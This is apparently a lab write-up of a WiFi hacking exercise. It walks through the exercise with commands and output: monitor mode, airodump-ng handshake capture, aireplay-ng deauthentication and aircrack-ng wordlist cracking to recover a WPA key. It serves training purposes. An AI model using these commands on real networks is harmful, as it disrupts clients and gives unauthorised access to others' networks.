# (Day 11) - Advent of Cyber

## WiFi Hacking (WPA/WPA2)

First step in getting a connection to the WiFi is to connect to using ssh using the command:

```
ssh glitch@10.10.149.214 
password: "Password321"
```

We will open this ssh connection on two separate windows, first we will do some simple WiFi enumeration.

#### WiFi Enumeration

To perform the enumeration we will first make use of the following command:

```
iw dev
```

By running this command we receive information about the wireless interface that we are connected to:

```
phy#2
    Interface wlan2
            ifindex 5
            wdev 0x200000001
            addr 02:00:00:00:02:00
            type managed
            channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
            txpower 20.00 dBm

```

There we are able to obtain the bssid address of our wifi interface which in this case is `02:00:00:00:02:00`. Additionally, we see that the type of our interface is managed, what that means is that our computer is a client to this wifi interface, this type helps connect the device to other wireless networks.

We see the name of the interface is wlan2, we can use this interface to identify nearby networks using the command:

```
sudo iw dev wlan2 scan
```

From this command we receive the output:

```
BSS 02:00:00:00:00:00(on wlan2)
	last seen: 520.388s [boottime]
	TSF: 1730575383370084 usec (20029d, 19:23:03)
	freq: 2437
	beacon interval: 100 TUs
	capability: ESS Privacy ShortSlotTime (0x0411)
	signal: -30.00 dBm
	last seen: 0 ms ago
	Information elements from Probe Response frame:
	SSID: MalwareM_AP
	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 6
	ERP: Barker_Preamble_Mode
	Extended supported rates: 24.0 36.0 48.0 54.0 
	RSN:	 * Version: 1
		 * Group cipher: CCMP
		 * Pairwise ciphers: CCMP
		 * Authentication suites: PSK
		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
	Supported operating classes:
		 * current operating class: 81
	Extended capabilities:
		 * Extended Channel Switching
		 * Operating Mode Notification
```

From this we are able to identify the SSID and BSSID of the access point, these are:
`BSSID: 02:00:00:00:00:00` and `SSID: MalwareM_AP`.

We will now switch our interface to monitor mode, what this does is captures all network traffic on a specific channel, we can use this to snoop on a handshaking process to obtain a WPA/WPA2 encrypted password, which we should be able to crack. 

We can do this using the following commands:

```
sudo ip link set dev wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set dev wlan2 up
```

To confirm, we can check using the command:

```
sudo iw dev wlan2 info
```

Next we need to make sure we have two terminals running as we will need some commands to be left running in the background. 
Now we will be making use of airodump-ng to capture the traffic especially the 4-way handshake, this will be running in the first terminal:

```
sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
```

After running this command for a little while, we will see some client information, under the `STATION` subheading we see the BSSID for the client connected to the access point here:

![[Pasted image 20241220051546.png]]

Now we can commence with sending deauthentication packets to disconnect the client from the access point and thus forcing them to perform the 4-way handshake again which we can capture using command that is currently running in the background.

In our second terminal we will run the following command to send the deauthentication packets:

```
sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
```

We see we are successful in two ways, first is seeing the output from the command here:

```
05:03:12  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
05:03:12  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```

Additionally back in the capture command that was running the background we see that it shows that a WPA handshake was captured:

![[Pasted image 20241220052050.png]]

Now that we have captured the handshake we can stop the capture using `CTRL-C`.
Now because they were using the crackable WPA we can attempt to crack the password used for the WiFi using the following command:

```
sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
```

Then we receive the following password as it successfully cracks the WPA encrypted password we captured, so that now we have the password we should be able to easily connect to the access point:

```
Reading packets, please wait...                                                                                                                                                        
Opening output-file-02.cap                                                                                                                                                             
Read 276 packets.
1 potential targets
Opening output-file-01.cap     

                               Aircrack-ng 1.6 

      [00:00:01] 488/513 keys tested (605.35 k/s) 

      Time left: 0 seconds                                      95.13%

                        KEY FOUND! [ fluffy/champ24 ]


      Master Key     : 44 9B 35 B0 98 49 3D E2 C2 BB 98 AF F6 22 38 64 
                       48 9A DA 09 A5 CC C9 D7 5C 33 DD 5F 3A 4A 43 EB 

      Transient Key  : FB 19 0E EE 86 F0 AF 8A E8 4B 80 B5 8D 5D 63 26 
                       29 1C 0D 74 9E 15 69 C7 70 EB B6 0F A3 AE 3A 8E 
                       47 D8 E3 F5 54 13 68 07 00 17 C2 38 21 D6 61 FD 
                       0F 5A F2 4C 80 21 56 B6 DF 31 36 C6 88 7A 57 A1 

      EAPOL HMAC     : 60 4D 0F CC 05 D5 76 95 76 2F 46 A5 B3 43 EC 49 
```
